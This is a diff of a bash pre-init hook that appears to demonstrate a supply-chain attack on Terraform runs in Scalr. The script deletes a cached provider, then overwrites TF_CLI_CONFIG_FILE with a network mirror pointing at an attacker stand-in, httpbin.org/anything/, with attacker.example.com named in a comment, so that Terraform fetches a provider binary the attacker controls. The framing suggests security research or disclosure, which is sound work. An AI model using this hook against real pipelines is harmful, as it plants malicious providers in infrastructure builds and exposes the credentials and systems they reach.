@@ -1,16 +1,27 @@
 #!/usr/bin/env bash
-# PRE-INIT HOOK: runs before Terraform initializes plugins
-# Goal: redirect provider downloads to attacker-controlled server
+# PRE-INIT SUPPLY CHAIN DEMO
+# Runs BEFORE Terraform initializes plugins.
+# Overwrites TF_CLI_CONFIG_FILE (not ~/.terraformrc) to redirect provider downloads.
+# Also clears plugin cache so provider must be re-downloaded.
 
-echo "=== PRE-INIT: TF_CLI_CONFIG_FILE location ==="
-echo "TF_CLI_CONFIG_FILE: ${TF_CLI_CONFIG_FILE}"
-echo "Current contents:"
-cat "${TF_CLI_CONFIG_FILE}" 2>/dev/null || echo "(file not yet written by Scalr)"
+echo "=== PRE-INIT: environment ==="
+echo "TF_CLI_CONFIG_FILE=${TF_CLI_CONFIG_FILE}"
+echo "TF_PLUGIN_CACHE_DIR=${TF_PLUGIN_CACHE_DIR}"
 
 echo ""
-echo "=== PRE-INIT: overwrite with attacker mirror ==="
-# httpbin.org/anything/ is the stand-in for attacker's provider mirror server
-# In a real attack: replace with https://attacker.example.com/providers/
+echo "=== PRE-INIT: clear provider cache to force re-download ==="
+if [ -d "${TF_PLUGIN_CACHE_DIR}" ]; then
+    CACHE_BEFORE=$(find "${TF_PLUGIN_CACHE_DIR}" -name "terraform-provider-*" 2>/dev/null | wc -l)
+    echo "Cached providers before: $CACHE_BEFORE"
+    rm -rf "${TF_PLUGIN_CACHE_DIR}/registry.terraform.io/hashicorp/null"
+    echo "Deleted null provider from cache — will force download from mirror"
+else
+    echo "No cache dir found"
+fi
+
+echo ""
+echo "=== PRE-INIT: overwrite TF_CLI_CONFIG_FILE with attacker mirror ==="
+echo "Writing to: ${TF_CLI_CONFIG_FILE}"
 cat > "${TF_CLI_CONFIG_FILE}" << 'TFRC'
 provider_installation {
   network_mirror {
@@ -22,9 +33,8 @@ provider_installation {
   }
 }
 TFRC
-
-echo "Wrote attacker mirror to TF_CLI_CONFIG_FILE:"
+echo "New config:"
 cat "${TF_CLI_CONFIG_FILE}"
 echo ""
-echo "Terraform will now try to download hashicorp/null from httpbin.org/anything/"
-echo "(Watch next log section for provider download attempt to attacker server)"
+echo "Terraform init will now contact httpbin.org/anything/ for hashicorp/null provider"
+echo "(attacker server stand-in — in real attack serves malicious binary)"
